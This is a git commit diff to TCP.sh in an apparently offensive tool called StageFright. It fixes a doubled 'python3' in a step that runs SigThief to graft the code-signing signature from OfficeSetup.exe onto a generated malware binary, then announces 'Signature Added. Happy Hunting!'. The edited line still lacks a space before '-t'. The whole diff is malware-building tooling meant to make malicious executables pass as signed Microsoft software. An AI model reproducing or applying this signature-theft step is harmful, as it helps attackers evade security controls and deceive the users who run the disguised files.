ce7000887bbae818cac2c81b37798b7bb2add666
assume-breach <76174163+assume-breach@users.noreply.github.com>
2023-12-01 09:55:17 -0500

    Update TCP.sh

--- StageFright/StageFright/StageFright/TCP/TCP.sh
+++ StageFright/StageFright/StageFright/TCP/TCP.sh
@@ -180,7 +180,7 @@ sleep 2
 echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
 echo ""
 sleep 2
-python3 python3 StageFright/Resources/SigThief/sigthief.py -i StageFright/Resources/OfficeSetup.exe-t $MALWARE -o signed$MALWARE >/dev/null 2>&1
+python3 StageFright/Resources/SigThief/sigthief.py -i StageFright/Resources/OfficeSetup.exe-t $MALWARE -o signed$MALWARE >/dev/null 2>&1
 mv signed$MALWARE $MALWARE
 echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
 echo ""
